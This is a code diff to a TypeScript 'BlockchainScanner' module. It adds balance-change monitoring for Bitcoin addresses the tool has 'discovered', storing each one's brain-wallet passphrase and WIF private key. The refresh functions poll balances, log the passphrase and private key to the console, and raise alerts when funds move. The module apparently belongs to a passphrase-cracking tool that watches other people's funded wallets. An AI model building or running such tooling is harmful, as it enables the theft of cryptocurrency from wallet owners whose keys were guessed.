@@ -224,7 +224,59 @@ export interface BalanceHit {
   txCount: number;
   discoveredAt: string;
   isCompressed: boolean;
+  lastChecked?: string;
+  previousBalanceSats?: number;
+  balanceChanged?: boolean;
+  changeDetectedAt?: string;
 }
+
+/**
+ * Balance change event for tracking movements
+ */
+export interface BalanceChangeEvent {
+  address: string;
+  previousBalance: number;
+  newBalance: number;
+  difference: number;
+  detectedAt: string;
+  passphrase: string;
+  wif: string;
+}
+
+// Track balance changes separately for alerting
+const balanceChanges: BalanceChangeEvent[] = [];
+const BALANCE_CHANGES_FILE = 'data/balance-changes.json';
+
+/**
+ * Load balance changes from disk
+ */
+async function loadBalanceChanges(): Promise<void> {
+  try {
+    const fs = await import('fs/promises');
+    const data = await fs.readFile(BALANCE_CHANGES_FILE, 'utf-8');
+    const saved = JSON.parse(data);
+    balanceChanges.push(...saved);
+    console.log(`[BlockchainScanner] Loaded ${balanceChanges.length} balance change events from disk`);
+  } catch {
+    // File doesn't exist yet, that's fine
+  }
+}
+
+/**
+ * Save balance changes to disk
+ */
+async function saveBalanceChanges(): Promise<void> {
+  try {
+    const fs = await import('fs/promises');
+    await fs.mkdir('data', { recursive: true });
+    await fs.writeFile(BALANCE_CHANGES_FILE, JSON.stringify(balanceChanges, null, 2));
+  } catch (error) {
+    console.error('[BlockchainScanner] Error saving balance changes:', error);
+  }
+}
+
+// Load changes on init
+loadBalanceChanges();
 
 // In-memory storage for balance hits (persisted to disk)
 const balanceHits: BalanceHit[] = [];
@@ -356,6 +408,176 @@ export function getBalanceHits(): BalanceHit[] {
  */
 export function getActiveBalanceHits(): BalanceHit[] {
   return balanceHits.filter(h => h.balanceSats > 0);
+}
+
+/**
+ * Get all recorded balance changes
+ */
+export function getBalanceChanges(): BalanceChangeEvent[] {
+  return [...balanceChanges];
+}
+
+/**
+ * Refresh balance for a single address and detect changes
+ */
+export async function refreshSingleBalance(address: string): Promise<{
+  updated: boolean;
+  changed: boolean;
+  hit: BalanceHit | null;
+  error?: string;
+}> {
+  const hit = balanceHits.find(h => h.address === address);
+  if (!hit) {
+    return { updated: false, changed: false, hit: null, error: 'Address not found in balance hits' };
+  }
+
+  const balanceInfo = await fetchAddressBalance(address);
+  if (!balanceInfo) {
+    return { updated: false, changed: false, hit, error: 'Failed to fetch balance from API' };
+  }
+
+  const previousBalance = hit.balanceSats;
+  const newBalance = balanceInfo.balanceSats;
+  const now = new Date().toISOString();
+  
+  hit.lastChecked = now;
+  hit.previousBalanceSats = previousBalance;
+  
+  if (previousBalance !== newBalance) {
+    hit.balanceChanged = true;
+    hit.changeDetectedAt = now;
+    hit.balanceSats = newBalance;
+    hit.balanceBTC = (newBalance / 100000000).toFixed(8);
+    hit.txCount = balanceInfo.txCount;
+    
+    const changeEvent: BalanceChangeEvent = {
+      address,
+      previousBalance,
+      newBalance,
+      difference: newBalance - previousBalance,
+      detectedAt: now,
+      passphrase: hit.passphrase,
+      wif: hit.wif,
+    };
+    
+    balanceChanges.push(changeEvent);
+    await saveBalanceChanges();
+    
+    const direction = newBalance > previousBalance ? '📈 INCREASED' : '📉 DECREASED';
+    const diffBTC = Math.abs(newBalance - previousBalance) / 100000000;
+    console.log(`\n⚠️  [BALANCE CHANGE] ${address}`);
+    console.log(`   ${direction}: ${previousBalance / 100000000} → ${newBalance / 100000000} BTC`);
+    console.log(`   Difference: ${diffBTC.toFixed(8)} BTC`);
+    console.log(`   🔑 Passphrase: "${hit.passphrase}"`);
+    console.log(`   🔐 WIF: ${hit.wif}\n`);
+    
+    await saveBalanceHits();
+    return { updated: true, changed: true, hit };
+  }
+  
+  hit.balanceChanged = false;
+  await saveBalanceHits();
+  return { updated: true, changed: false, hit };
+}
+
+/**
+ * Refresh all balance hits and detect any changes
+ * Returns summary of refresh operation
+ */
+export async function refreshAllBalances(options?: {
+  delayMs?: number;
+  onProgress?: (current: number, total: number, address: string) => void;
+}): Promise<{
+  total: number;
+  refreshed: number;
+  changed: number;
+  errors: number;
+  changes: BalanceChangeEvent[];
+  duration: number;
+}> {
+  const startTime = Date.now();
+  const delayMs = options?.delayMs ?? 1000; // Default 1 second between API calls to avoid rate limiting
+  
+  let refreshed = 0;
+  let changed = 0;
+  let errors = 0;
+  const newChanges: BalanceChangeEvent[] = [];
+  
+  console.log(`[BlockchainScanner] Starting balance refresh for ${balanceHits.length} addresses...`);
+  
+  for (let i = 0; i < balanceHits.length; i++) {
+    const hit = balanceHits[i];
+    
+    if (options?.onProgress) {
+      options.onProgress(i + 1, balanceHits.length, hit.address);
+    }
+    
+    const result = await refreshSingleBalance(hit.address);
+    
+    if (result.error) {
+      errors++;
+      console.error(`[BlockchainScanner] Error refreshing ${hit.address}: ${result.error}`);
+    } else if (result.updated) {
+      refreshed++;
+      if (result.changed) {
+        changed++;
+        const latestChange = balanceChanges[balanceChanges.length - 1];
+        if (latestChange) {
+          newChanges.push(latestChange);
+        }
+      }
+    }
+    
+    // Rate limiting delay between API calls
+    if (i < balanceHits.length - 1 && delayMs > 0) {
+      await new Promise(resolve => setTimeout(resolve, delayMs));
+    }
+  }
+  
+  const duration = Date.now() - startTime;
+  
+  console.log(`[BlockchainScanner] Balance refresh complete:`);
+  console.log(`   Total: ${balanceHits.length}, Refreshed: ${refreshed}, Changed: ${changed}, Errors: ${errors}`);
+  console.log(`   Duration: ${(duration / 1000).toFixed(1)}s`);
+  
+  if (changed > 0) {
+    console.log(`\n🚨 [ALERT] ${changed} balance(s) have changed!`);
+  }
+  
+  return {
+    total: balanceHits.length,
+    refreshed,
+    changed,
+    errors,
+    changes: newChanges,
+    duration,
+  };
+}
+
+/**
+ * Get the last time balances were checked
+ */
+export function getLastBalanceCheck(): string | null {
+  const lastCheckedDates = balanceHits
+    .filter(h => h.lastChecked)
+    .map(h => new Date(h.lastChecked!).getTime());
+  
+  if (lastCheckedDates.length === 0) return null;
+  
+  const mostRecent = Math.max(...lastCheckedDates);
+  return new Date(mostRecent).toISOString();
+}
+
+/**
+ * Get addresses that haven't been checked recently
+ */
+export function getStaleBalanceHits(maxAgeMinutes: number = 30): BalanceHit[] {
+  const threshold = Date.now() - maxAgeMinutes * 60 * 1000;
+  
+  return balanceHits.filter(h => {
+    if (!h.lastChecked) return true;
+    return new Date(h.lastChecked).getTime() < threshold;
+  });
 }
 
 /**
